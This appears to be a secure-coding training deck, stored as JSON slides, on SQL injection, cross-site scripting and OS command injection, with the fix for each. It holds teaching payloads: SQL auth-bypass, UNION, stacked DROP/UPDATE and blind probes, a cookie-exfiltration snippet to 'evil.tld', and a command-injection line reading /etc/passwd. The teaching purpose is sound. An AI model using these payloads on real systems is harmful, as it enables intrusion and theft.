  "slides": [
    {
      "page_title": "What Injection Is",
      "blocks": [
        {
          "type": "heading",
          "text": "1. Data That Becomes Code",
          "ink": "blue"
        },
        {
          "type": "paragraph",
          "text": "Attacker-supplied data crosses a boundary and gets interpreted as code or commands instead of inert data. That crossing is the whole bug class."
        },
        {
          "type": "heading",
          "text": "2. Root Cause"
        },
        {
          "type": "bullets",
          "items": [
            "Untrusted data mixed into a control string",
            "Query, markup, or shell command built by concatenation",
            "One flat string reaches the interpreter"
          ]
        },
        {
          "type": "code",
          "lang": "python",
          "lines": [
            "q = \"SELECT * FROM users WHERE name='\"",
            "q = q + name + \"'\"   # name: data or syntax?",
            "cur.execute(q)       # engine cannot tell"
          ]
        },
        {
          "type": "heading",
          "text": "3. The Confusion"
        },
        {
          "type": "bullets",
          "items": [
            "Interpreter sees one string, no authorship tags",
            "Developer intent and attacker input arrive fused",
            "Quotes decide meaning; attacker supplies quotes"
          ]
        },
        {
          "type": "heading",
          "text": "4. Trust Boundaries"
        },
        {
          "type": "bullets",
          "items": [
            "HTTP params, path segments, headers, cookies",
            "Uploaded file names and file contents",
            "Responses from upstream services and queues",
            "Anything read back out of your own database"
          ]
        },
        {
          "type": "heading",
          "text": "5. Interpreters In Range"
        },
        {
          "type": "table",
          "headers": [
            "Interpreter",
            "Payload lands in"
          ],
          "rows": [
            [
              "SQL engine",
              "query text"
            ],
            [
              "Browser parser",
              "HTML / JS"
            ],
            [
              "OS shell",
              "/bin/sh, cmd.exe"
            ],
            [
              "LDAP, XPath",
              "filter string"
            ],
            [
              "NoSQL, templates",
              "operator, expression"
            ]
          ]
        },
        {
          "type": "heading",
          "text": "6. Impact Spectrum"
        },
        {
          "type": "bullets",
          "items": [
            "Data theft, then auth bypass",
            "Data tampering, silent record edits",
            "Remote code execution, full host compromise",
            "Lateral movement into the internal network"
          ]
        },
        {
          "type": "sidebox",
          "title": "Standing",
          "items": [
            "Top of OWASP Top 10 for a decade+",
            "A03:2021 folds XSS into Injection",
            "Same defect, three interpreters"
          ],
          "ink": "red"
        },
        {
          "type": "callout",
          "style": "takeaway",
          "title": "Whole Handbook In One Line",
          "text": "Fix is structural separation of code from data — never filtering 'bad characters'."
        },
        {
          "type": "heading",
          "text": "1. The Vulnerable Shape",
          "ink": "red"
        },
        {
          "type": "code",
          "lang": "python",
          "lines": [
            "name = request.args[\"name\"]",
            "sql = f\"SELECT * FROM users WHERE\"",
            "sql += f\" name='{name}'\"  # input is syntax"
          ]
        },
        {
          "type": "code",
          "lang": "javascript",
          "lines": [
            "execFile(\"ping\", [\"-c\",\"1\",host], cb)  // safe",
            "// exec(\"ping \" + host) spawns /bin/sh"
          ]
        }
      ]
    },
    {
      "page_title": "SQL Injection Mechanics",
      "blocks": [
        {
          "type": "bullets",
          "items": [
            "Input lands inside the quotes",
            "Close the quote and you own the clause"
          ]
        },
        {
          "type": "heading",
          "text": "2. Auth Bypass Classic"
        },
        {
          "type": "table",
          "headers": [
            "Input",
            "WHERE becomes",
            "Effect"
          ],
          "rows": [
            [
              "bob",
              "name='bob'",
              "normal"
            ],
            [
              "' OR '1'='1",
              "name='' OR '1'='1'",
              "always true"
            ],
            [
              "' OR 1=1--",
              "name='' OR 1=1",
              "rest cut"
            ]
          ]
        },
        {
          "type": "heading",
          "text": "3. Comment Truncation"
        },
        {
          "type": "code",
          "lang": "sql",
          "lines": [
            "-- input: admin'--",
            "SELECT * FROM users WHERE name='admin'--'",
            "  AND pass='whatever'  -- never evaluated"
          ]
        },
        {
          "type": "bullets",
          "items": [
            "-- in most engines, # in MySQL",
            "/* */ works inline too",
            "Password check simply disappears"
          ]
        },
        {
          "type": "heading",
          "text": "4. UNION Extraction"
        },
        {
          "type": "code",
          "lang": "sql",
          "lines": [
            "' UNION SELECT username,password",
            "  FROM users--  -- pulls a foreign table",
            "' UNION SELECT NULL,NULL--  -- probe count"
          ]
        },
        {
          "type": "bullets",
          "items": [
            "Column count must match exactly",
            "Types must be compatible; pad with NULL",
            "ORDER BY 1,2,3.. finds the count fast"
          ]
        },
        {
          "type": "heading",
          "text": "5. Stacked Queries"
        },
        {
          "type": "code",
          "lang": "sql",
          "lines": [
            "'; DROP TABLE users--   -- second statement",
            "'; UPDATE users SET role='admin'--"
          ]
        },
        {
          "type": "table",
          "headers": [
            "Driver",
            "Multi-statement"
          ],
          "rows": [
            [
              "MySQLi query",
              "no"
            ],
            [
              "PHP PDO/MySQL",
              "often yes"
            ],
            [
              "SQL Server",
              "yes"
            ],
            [
              "Postgres simple",
              "yes"
            ]
          ]
        },
        {
          "type": "heading",
          "text": "6. Numeric Context"
        },
        {
          "type": "code",
          "lang": "sql",
          "lines": [
            "-- input: 1 OR 1=1  (no quote)",
            "SELECT * FROM items",
            "  WHERE id=1 OR 1=1  -- all rows"
          ],
          "note": "no quote to escape here"
        },
        {
          "type": "bullets",
          "items": [
            "Integer params carry no quotes to break",
            "Quote-escaping gives ==zero== protection here"
          ]
        },
        {
          "type": "heading",
          "text": "7. Injection Points"
        },
        {
          "type": "table",
          "headers": [
            "Source",
            "Example"
          ],
          "rows": [
            [
              "Query param",
              "?id=1'"
            ],
            [
              "Form field",
              "login name"
            ],
            [
              "Cookie",
              "saved pref"
            ],
            [
              "Header",
              "User-Agent"
            ]
          ]
        },
        {
          "type": "sidebox",
          "title": "Fingerprint The Engine",
          "items": [
            "# comment works only on MySQL",
            "|| vs CONCAT() string joins",
            "Error text names the vendor"
          ],
          "ink": "purple"
        },
        {
          "type": "heading",
          "text": "1. Blind Boolean",
          "ink": "blue"
        },
        {
          "type": "paragraph",
          "text": "No data comes back, but the page differs on true vs false. Every request leaks one bit."
        },
        {
          "type": "code",
          "lang": "sql",
          "lines": [
            "' AND 1=1--   -- page renders normally",
            "' AND 1=2--   -- page empty / 404",
            "' AND SUBSTR(pass,1,1)='a'--  -- bit by bit"
          ]
        }
      ]
    },
    {
      "page_title": "SQL Injection Mechanics (cont.)",
      "blocks": [
        {
          "type": "bullets",
          "items": [
            "==Binary search== on ASCII halves the requests",
            "ASCII(SUBSTR(pass,1,1))>77 per step",
            "Length or status code is the **oracle**"
          ]
        }
      ],
      "cont": true
    },
    {
      "page_title": "Blind & Advanced SQLi",
      "blocks": [
        {
          "type": "heading",
          "text": "2. Time-Based"
        },
        {
          "type": "bullets",
          "items": [
            "Zero visible feedback: read data via latency",
            "Slow response = condition was true",
            "Noisy, but works on blind write-only paths"
          ]
        },
        {
          "type": "table",
          "headers": [
            "Engine",
            "Delay call"
          ],
          "rows": [
            [
              "MySQL",
              "SLEEP(5)"
            ],
            [
              "Postgres",
              "pg_sleep(5)"
            ],
            [
              "SQL Server",
              "WAITFOR DELAY"
            ],
            [
              "Oracle",
              "dbms_lock.sleep"
            ]
          ]
        },
        {
          "type": "heading",
          "text": "3. Error-Based"
        },
        {
          "type": "bullets",
          "items": [
            "Force a DB error, read the message",
            "Leaks column names, types, versions",
            "CAST/CONVERT errors echo the value itself"
          ]
        },
        {
          "type": "code",
          "lang": "sql",
          "lines": [
            "' AND 1=CAST((SELECT pass FROM users",
            "  LIMIT 1) AS int)--  -- value in the error"
          ]
        },
        {
          "type": "heading",
          "text": "4. Second-Order"
        },
        {
          "type": "diagram",
          "kind": "flow",
          "spec": {
            "nodes": [
              "payload stored safely",
              "read back later",
              "concatenated into query",
              "fires on other path"
            ]
          }
        },
        {
          "type": "bullets",
          "items": [
            "Insert used a placeholder; the report page did not",
            "Your own DB is an untrusted source",
            "Grep every sink, not just entry points"
          ]
        },
        {
          "type": "heading",
          "text": "5. Reconnaissance"
        },
        {
          "type": "table",
          "headers": [
            "Goal",
            "Probe"
          ],
          "rows": [
            [
              "Version",
              "version(), @@version"
            ],
            [
              "Tables",
              "information_schema.tables"
            ],
            [
              "Columns",
              "information_schema.columns"
            ],
            [
              "Current user",
              "current_user, user()"
            ]
          ]
        },
        {
          "type": "callout",
          "style": "tip",
          "title": "Detection Order",
          "text": "Break the quote, read the error, then downgrade to boolean, then to time. Latency is the last resort."
        },
        {
          "type": "heading",
          "text": "1. Prepared Statement",
          "ink": "green"
        },
        {
          "type": "bullets",
          "items": [
            "Query template carries placeholders (? or :name)",
            "Values travel to the DB separately from the text",
            "Two channels, never one string"
          ]
        },
        {
          "type": "heading",
          "text": "2. Why It Cannot Break"
        },
        {
          "type": "diagram",
          "kind": "flow",
          "spec": {
            "nodes": [
              "send template",
              "parse + compile plan",
              "bind values",
              "execute"
            ]
          }
        }
      ]
    },
    {
      "page_title": "Parameterised Queries",
      "blocks": [
        {
          "type": "bullets",
          "items": [
            "Structure is fixed before a value arrives",
            "A bound value can never become new syntax",
            "' OR '1'='1 is searched for as literal text"
          ]
        },
        {
          "type": "heading",
          "text": "3. Placeholder Styles"
        },
        {
          "type": "table",
          "headers": [
            "Style",
            "Looks like",
            "Seen in"
          ],
          "rows": [
            [
              "Positional",
              "?",
              "JDBC, SQLite"
            ],
            [
              "Numbered",
              "$1",
              "Postgres"
            ],
            [
              "Named",
              "​:id",
              "SQLAlchemy"
            ],
            [
              "Named",
              "@id",
              "SQL Server"
            ]
          ]
        },
        {
          "type": "heading",
          "text": "4. Python"
        },
        {
          "type": "code",
          "lang": "python",
          "lines": [
            "cur.execute(",
            "  \"SELECT * FROM users WHERE name=%s\",",
            "  (name,))   # tuple of values, never % or f"
          ]
        },
        {
          "type": "heading",
          "text": "5. Java"
        },
        {
          "type": "code",
          "lang": "java",
          "lines": [
            "PreparedStatement ps = c.prepareStatement(",
            "  \"SELECT * FROM users WHERE name=?\");",
            "ps.setString(1, name);  // bound as literal"
          ]
        },
        {
          "type": "heading",
          "text": "6. Values Only"
        },
        {
          "type": "bullets",
          "items": [
            "Placeholders bind values, not identifiers",
            "Table and column names cannot be bound",
            "Keywords like ASC/DESC cannot be bound"
          ]
        },
        {
          "type": "code",
          "lang": "python",
          "lines": [
            "COLS = {\"name\": \"name\", \"age\": \"age\"}",
            "col = COLS.get(choice, \"name\")  # allowlist",
            "q = f\"SELECT * FROM t ORDER BY {col}\""
          ]
        },
        {
          "type": "heading",
          "text": "7. ORMs And Procs"
        },
        {
          "type": "bullets",
          "items": [
            "Hibernate, SQLAlchemy, ActiveRecord: safe by default",
            "raw(), text(), interpolation reopen the hole",
            "Stored procs help only if they parameterise inside",
            "Dynamic SQL built inside a proc is still injectable"
          ]
        },
        {
          "type": "heading",
          "text": "8. Look-Alike Fixes"
        },
        {
          "type": "code",
          "lang": "python",
          "lines": [
            "# WRONG: string built first",
            "cur.execute(\"..name='%s'\" % name)",
            "cur.execute(f\"..name='{name}'\")"
          ],
          "note": "% formats before the driver sees it"
        },
        {
          "type": "bullets",
          "items": [
            "% and f-strings run **before** the driver",
            "Driver receives one flat string again",
            "A comma, not %, passes the values"
          ],
          "style": "cross"
        },
        {
          "type": "heading",
          "text": "9. Node.js"
        },
        {
          "type": "code",
          "lang": "javascript",
          "lines": [
            "await db.query(",
            "  \"SELECT * FROM t WHERE id=$1\",",
            "  [id])  // pg driver binds $1"
          ]
        },
        {
          "type": "callout",
          "style": "tip",
          "title": "IN (...) Lists",
          "text": "Generate one placeholder per item (?,?,?) and bind the list — never join the values into the text."
        },
        {
          "type": "sidebox",
          "title": "Least Privilege (Depth)",
          "items": [
            "App account owns no DDL, no DROP",
            "No read access to other schemas",
            "Separate account for migrations"
          ],
          "ink": "red"
        }
      ]
    },
    {
      "page_title": "Cross-Site Scripting",
      "blocks": [
        {
          "type": "heading",
          "text": "1. What XSS Buys",
          "ink": "blue"
        },
        {
          "type": "paragraph",
          "text": "Attacker JavaScript runs in the victim's browser inside the trusted origin of the vulnerable site. Same-origin policy protects the attacker, not you."
        },
        {
          "type": "heading",
          "text": "2. Three Flavours"
        },
        {
          "type": "table",
          "headers": [
            "Type",
            "Payload lives",
            "Delivery"
          ],
          "rows": [
            [
              "Reflected",
              "in the request",
              "crafted link"
            ],
            [
              "Stored",
              "server-side row",
              "every viewer"
            ],
            [
              "DOM-based",
              "client JS only",
              "no round-trip"
            ]
          ]
        },
        {
          "type": "bullets",
          "items": [
            "Reflected: URL param echoed straight into the response",
            "Stored: comment, profile, message — biggest blast radius",
            "DOM: server never sees the payload after the #"
          ]
        },
        {
          "type": "heading",
          "text": "3. DOM-Based Shape"
        },
        {
          "type": "code",
          "lang": "javascript",
          "lines": [
            "const t = location.hash.slice(1)  // source",
            "el.innerHTML = t                 // sink",
            "// #<img src=x onerror=alert(1)>"
          ]
        },
        {
          "type": "heading",
          "text": "4. Dangerous Sinks"
        },
        {
          "type": "bullets",
          "items": [
            "innerHTML, outerHTML, document.write",
            "eval, setTimeout(string), new Function",
            "setAttribute('href', ...) with javascript: URIs"
          ]
        },
        {
          "type": "heading",
          "text": "5. Sources In The DOM"
        },
        {
          "type": "bullets",
          "items": [
            "location, location.hash, location.search",
            "document.referrer, window.name",
            "postMessage event.data",
            "stored server data rendered into JS"
          ]
        },
        {
          "type": "heading",
          "text": "6. Impact"
        },
        {
          "type": "bullets",
          "items": [
            "Cookie theft via document.cookie",
            "Session riding: requests as the logged-in user",
            "Keylogging and credential phishing overlays",
            "CSRF token theft, then worm propagation"
          ]
        },
        {
          "type": "heading",
          "text": "7. Mutation XSS"
        },
        {
          "type": "bullets",
          "items": [
            "Browser re-parses and normalises inserted HTML",
            "A sanitised-looking string becomes executable after insertion",
            "Why hand-written sanitisers keep losing"
          ]
        },
        {
          "type": "heading",
          "text": "8. Payload Per Context"
        },
        {
          "type": "table",
          "headers": [
            "Lands in",
            "Payload"
          ],
          "rows": [
            [
              "HTML body",
              "<script>…</script>"
            ],
            [
              "Attribute",
              "\" onfocus=…"
            ],
            [
              "href",
              "javascript:…"
            ],
            [
              "innerHTML",
              "<img onerror=…>"
            ]
          ]
        },
        {
          "type": "heading",
          "text": "9. Cookie Theft Shape"
        },
        {
          "type": "code",
          "lang": "javascript",
          "lines": [
            "new Image().src =",
            "  \"//evil.tld/?c=\" +",
            "  document.cookie  // exfil"
          ],
          "note": "HttpOnly hides the cookie here"
        }
      ]
    },
    {
      "page_title": "Cross-Site Scripting (cont.)",
      "blocks": [
        {
          "type": "callout",
          "style": "cloud",
          "title": "HttpOnly Is Partial",
          "text": "It blunts cookie theft only. The script still defaces, keylogs, and acts as the user with their live session."
        }
      ],
      "cont": true
    },
    {
      "page_title": "Output Encoding",
      "blocks": [
        {
          "type": "heading",
          "text": "1. Encode At The Landing Spot",
          "ink": "green"
        },
        {
          "type": "bullets",
          "items": [
            "Encode untrusted data at output time",
            "Encoding is chosen by the context it lands in",
            "One value, many contexts, many encodings"
          ]
        },
        {
          "type": "heading",
          "text": "2. HTML Body Context"
        },
        {
          "type": "table",
          "headers": [
            "Char",
            "Entity"
          ],
          "rows": [
            [
              "<",
              "&lt;"
            ],
            [
              ">",
              "&gt;"
            ],
            [
              "&",
              "&amp;"
            ],
            [
              "\"",
              "&quot;"
            ],
            [
              "'",
              "&#39;"
            ]
          ]
        },
        {
          "type": "heading",
          "text": "3. Attribute Context"
        },
        {
          "type": "bullets",
          "items": [
            "Always quote the attribute, then entity-encode",
            "Unquoted attributes break on a bare space",
            "Space lets an attacker append onerror="
          ]
        },
        {
          "type": "heading",
          "text": "4. JavaScript Context"
        },
        {
          "type": "code",
          "lang": "html",
          "lines": [
            "<div id=\"d\" data-user=\"{{ name|e }}\"></div>",
            "<script>",
            "const n = d.dataset.user  // read, not build",
            "</script>"
          ]
        },
        {
          "type": "bullets",
          "items": [
            "Never build script source from strings",
            "Ship data as JSON in a data-* attribute",
            "JS string escaping only if you must inline"
          ]
        },
        {
          "type": "heading",
          "text": "5. URL And CSS"
        },
        {
          "type": "bullets",
          "items": [
            "encodeURIComponent for each param value",
            "Validate the scheme: block javascript: and data:",
            "Encode inside style values; untrusted CSS exfiltrates data",
            "expression()-style abuse still haunts legacy engines"
          ]
        },
        {
          "type": "heading",
          "text": "6. Prefer Safe Sinks"
        },
        {
          "type": "code",
          "lang": "javascript",
          "lines": [
            "el.textContent = userText  // never parsed",
            "const a = document.createElement(\"a\")",
            "a.setAttribute(\"href\", safeUrl)"
          ]
        },
        {
          "type": "heading",
          "text": "7. Framework Escape Hatches"
        },
        {
          "type": "table",
          "headers": [
            "Framework",
            "The hole"
          ],
          "rows": [
            [
              "React",
              "dangerouslySetInnerHTML"
            ],
            [
              "Vue",
              "v-html"
            ],
            [
              "Django/Jinja",
              "|safe"
            ],
            [
              "Angular",
              "bypassSecurityTrust"
            ]
          ]
        },
        {
          "type": "heading",
          "text": "8. When HTML Is Required"
        },
        {
          "type": "code",
          "lang": "javascript",
          "lines": [
            "const clean = DOMPurify.sanitize(dirty)",
            "el.innerHTML = clean  // vetted allowlist",
            "// never a hand-rolled regex blocklist"
          ]
        },
        {
          "type": "sidebox",
          "title": "CSP As Depth",
          "items": [
            "Restrict script-src to known origins",
            "Block inline script; use nonces",
            "Buys mitigation, not a substitute"
          ],
          "ink": "red"
        },
        {
          "type": "callout",
          "style": "takeaway",
          "title": "Output, Not Input",
          "text": "The same row renders into HTML, an attribute, and a URL. Encode per context at render time, never once on the way in."
        }
      ]
    },
    {
      "page_title": "Output Encoding (cont.)",
      "blocks": [
        {
          "type": "heading",
          "text": "1. Reaching The Shell",
          "ink": "red"
        },
        {
          "type": "paragraph",
          "text": "Untrusted input reaches an OS shell command, so the attacker runs arbitrary system commands as the app user."
        },
        {
          "type": "code",
          "lang": "python",
          "lines": [
            "os.system(\"ping -c 1 \" + host)  # shell parses",
            "os.popen(\"convert \" + filename)",
            "# one string again, new interpreter"
          ]
        },
        {
          "type": "heading",
          "text": "2. Metacharacters"
        },
        {
          "type": "table",
          "headers": [
            "Char",
            "Does"
          ],
          "rows": [
            [
              ";",
              "chain always"
            ],
            [
              "&&  ||",
              "chain on status"
            ],
            [
              "|",
              "pipe output"
            ],
            [
              "$(..)  `..`",
              "substitute"
            ],
            [
              "newline",
              "new command"
            ]
          ]
        },
        {
          "type": "bullets",
          "items": [
            "> and < redirect files in and out",
            "$( ) and backticks still run inside \"double quotes\"",
            "Hand-escaping always misses **one** of these"
          ]
        },
        {
          "type": "heading",
          "text": "3. Payload"
        },
        {
          "type": "code",
          "lang": "text",
          "lines": [
            "host = 8.8.8.8; cat /etc/passwd",
            "ping -c 1 8.8.8.8; cat /etc/passwd",
            "# second command runs as the app user"
          ]
        },
        {
          "type": "table",
          "headers": [
            "Feature",
            "Shells out to"
          ],
          "rows": [
            [
              "Network check",
              "ping"
            ],
            [
              "Thumbnails",
              "convert"
            ],
            [
              "PDF export",
              "wkhtmltopdf"
            ],
            [
              "Repo browser",
              "git"
            ]
          ]
        },
        {
          "type": "heading",
          "text": "4. Argument Injection"
        },
        {
          "type": "bullets",
          "items": [
            "No shell needed: leading - poses as a flag",
            "A filename like --output=/etc/cron.d/x",
            "Changes program behaviour, not just its input",
            "Terminate options with -- where supported"
          ]
        },
        {
          "type": "code",
          "lang": "bash",
          "lines": [
            "touch -- '-rf'   # attacker file",
            "rm *     # glob expands to -rf",
            "rm -- *  # -- ends option parsing"
          ],
          "note": "globs turn filenames into flags"
        },
        {
          "type": "heading",
          "text": "5. The Fix: No Shell"
        },
        {
          "type": "code",
          "lang": "python",
          "lines": [
            "subprocess.run(",
            "  [\"ping\", \"-c\", \"1\", host],",
            "  shell=False)  # argv, nothing re-parsed"
          ]
        },
        {
          "type": "bullets",
          "items": [
            "Array APIs hand args straight to execve",
            "No shell means no metacharacters to escape",
            "shell=True with concatenation is the whole bug"
          ]
        },
        {
          "type": "code",
          "lang": "javascript",
          "lines": [
            "// exec(cmd) runs /bin/sh -c",
            "spawn(\"ping\", [\"-c\", \"1\", host])",
            "execFile(\"ls\", [dir], cb) // argv"
          ],
          "note": "Node: execFile/spawn, never exec"
        },
        {
          "type": "sidebox",
          "title": "Language Traps",
          "items": [
            "PHP: system, exec, passthru, backticks",
            "Ruby: backticks, %x, system(string)",
            "Java: Runtime.exec(String) splits naively"
          ],
          "ink": "red"
        }
      ],
      "cont": true
    },
